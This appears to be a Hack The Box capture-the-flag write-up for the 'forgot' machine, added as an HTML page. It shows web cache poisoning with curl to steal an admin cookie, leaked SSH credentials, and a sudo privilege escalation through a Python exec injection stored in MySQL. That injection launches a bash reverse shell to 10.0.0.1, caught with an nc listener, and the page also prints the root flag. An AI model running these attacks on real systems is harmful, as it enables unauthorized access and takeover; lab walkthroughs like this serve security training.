@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>HTB forgot - HTB Writeups</title>
+  </head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">HTB Writeups</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">HTB forgot</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1677729069648"
+                  >2023-03-01 22:51</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1678122527523"
+                  >2023-03-06 12:08</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p>We start with an nmap scan:<br />
+nmap -sV -sC -oA nmap/intial 10.10.11.188<br />
+<img src="/_resources/082cadf136094aa9bb681ec28f56b69d.png" /></p>
+<p>We add the machine to our /etc/hosts file and then visit the site on port 80:</p>
+<p><img src="/_resources/e86926068ca24f8a9665988eff03e9d7.png" /></p>
+<p>We have a login screen with many cookies:</p>
+<p><img src="/_resources/1813a948472d4ef5b6e3769a160397b1.png" /></p>
+<p>There is also something strange in the requests the nmap scan output:<br />
+Via: 1.1 varnish (Varnish/6.2)</p>
+<p>We run nikto and wait to see what it pulls before attempting to run gobuster or feroxbuster.<br />
+Nikto gave nothing, and we try feroxbuster:<br />
+<img src="/_resources/ec746a33e9c04d54bfaac0abe49cfd5c.png" /></p>
+<p>Meanwhile, we can play with the login form.</p>
+<p>We try the forgot password function and enter admin. We get an error:<br />
+<img src="/_resources/84732728bf7243488b6f8052887cf7a5.png" /></p>
+<p>The reset page loads, but whatever we input gives us an invalid token error.</p>
+<p>Looking at the source code, we find a username:<br />
+<img src="/_resources/26d4289ec0c641e9bd3699403628d220.png" /></p>
+<p>robert-dev-14329<br />
+Someone made a python script for this box, but the hint we needed was that the username that works to get the token is robert-dev-36712<br />
+<img src="/_resources/76f6e39dee044fb89550cd829f2249b6.png" /></p>
+<p>We can experiment with this tomorrow.</p>
+<p>We login with the creds we created:<br />
+<img src="/_resources/075237878ce8473ba9fd27ca357ae00a.png" /></p>
+<p>We see a page called tickets with usernames:<br />
+<img src="/_resources/01c3ec3c15104a8e8d562475cab6b909.png" /></p>
+<p>We see another form:<br />
+<img src="/_resources/11c1616d8cf6459d90b9bac98cb002a1.png" /></p>
+<p>We learn from the post request that this is using a Jenkins service:<br />
+<img src="/_resources/f7c991f4108c4fe883980fc6c621d696.png" /></p>
+<p>We submit the form with our ip address and see what happens:<br />
+<img src="/_resources/cbbcd5a2f28547938284c75e9775588f.png" /></p>
+<p>We look at the source code and see a hidden disabled page called admin_tickets:<br />
+<img src="/_resources/ed57fb19b3af445da05a2212184d9625.png" /></p>
+<p>We try a cache poisoning attack. We will use curl commands to grab the cookies.</p>
+<p>curl -X "GET" -H "Host: 10.10.14.10:9980" <br />
+<a title="http://10.10.11.188/forgot?username=robert-dev-14329" href="http://10.10.11.188/forgot?username=robert-dev-14329">http://10.10.11.188/forgot?username=robert-dev-14329</a></p>
+<p>curl -s -o /dev/null -v -d "username=robert-dev-14329&amp;password=qwerty" <br />
+-X POST <a title="http://10.10.11.188/login" href="http://10.10.11.188/login">http://10.10.11.188/login</a></p>
+<p>We are able to grab a session cookie after logging in:<br />
+<img src="/_resources/a710eea59c814b339c0e9754fa34ec4d.png" /></p>
+<p>curl -i -d "to=Admin&amp;link=http://10.10.11.188/static/blahblah.png" <br />
+-H "Cookie: session=42252835-2fd8-45bc-b355-148b28556d20;"    <br />
+-X POST <a title="http://10.10.11.188/escalate" href="http://10.10.11.188/escalate">http://10.10.11.188/escalate</a></p>
+<p>We then send a request for an escalation using the server's ip address and wait to see if there is a post:<br />
+<img src="/_resources/1003617a38914971a49e34465f6febf2.png" /></p>
+<p>curl -I <a title="http://10.10.11.188/static/blahblah.png" href="http://10.10.11.188/static/blahblah.png">http://10.10.11.188/static/blahblah.png</a><br />
+We make a request to see if the cache was poisoned, and see if we get a new admin cookie:</p>
+<p><img src="/_resources/11cc1d49283a483d85c9231fdc9e1337.png" /></p>
+<p>curl -I -H "cookie: session=46594168-eb3f-4248-a197-7143b13714ed" <a title="http://10.10.11.188/admin_tickets" href="http://10.10.11.188/admin_tickets">http://10.10.11.188/admin_tickets</a><br />
+We make a request to see the admin_tickets page with the new cookie:<br />
+<img src="/_resources/5ee319b24b8b463c8903059ea450b123.png" /></p>
+<p>Now we use the browser to visit the site with the stolen admin cookie:<br />
+<img src="/_resources/b4e03511d5df4de9a27658afe1db4b2f.png" /><br />
+Looks like we have ssh credentials:<br />
+diego:dCb#1!x0%gjq</p>
+<p>We are able to login to ssh using:<br />
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" diego@10.10.11.188<br />
+<img src="/_resources/fa83ca9c6e1e480c9b1451fb0b86d152.png" /></p>
+<p>We run uname and find that the machine is running:<br />
+Linux forgot 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</p>
+<p>We start looking at the box, and notice that there are some internal ports:<br />
+<img src="/_resources/0e73f7b6d6e74a77a0760bffca66d425.png" /></p>
+<p>We can see that mysql is running on port 3306.<br />
+We can try the same credentials we used to ssh into the machine.<br />
+We use mysql -u diego -p<br />
+<img src="/_resources/1090790b1fdd448dbe9bf2609b6d22e3.png" /><br />
+There was nothing particularly useful there, and that version is not vulnerable to anything we can see.</p>
+<p>We run sudo -l and find an interesting file:<br />
+<img src="/_resources/dcc8cbbb911d4149b550e07c00e97491.png" /></p>
+<p>We found a method that we can try:</p>
+<p>First get two ssh sessions.</p>
+<p>Create the /dev/shm/kk.sh script. Something like this:</p>
+<p>#!/bin/bash<br />
+bash -i &gt;&amp; /dev/tcp/10.0.0.1/4443 0&gt;&amp;1</p>
+<p>chmod 777 kk.sh<br />
+<img src="/_resources/a49001d1d148487c9ce3ad6dffa3a0a4.png" /><br />
+Read the database creds from /opt/security/ml_security.py and log in to the database. Run these:</p>
+<p>use app;</p>
+<p>insert into escalate values ("lol","lol","lol",'hello=exec("""\nimport<br />
+os\nos.system("/dev/shm/kk.sh")\nprint("&amp;ErrMsg=%3Cimg%20src=%22http://imgur.com/bTkSe.png%22%20/%3E%3CSCRIPT%3Ealert%28%22xss%22%29%3C/SCRIPT%3E")""")');<br />
+<img src="/_resources/ac4d407f2fca48ef9f5ea1a046bc7362.png" /></p>
+<p>make listener</p>
+<p>nc -nvlp 4443</p>
+<p>On the second session just run:</p>
+<p>sudo /opt/security/ml_security.py<br />
+<img src="/_resources/0b4caf9835dd42d4a65c836539726eae.png" /></p>
+<p>We have a root shell and get the root.txt:<br />
+<img src="/_resources/a2c3e6df30054c449576d7b2b128a9ba.png" /><br />
+8d2b80b768aa54e9491cb8a2da18e6f2</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
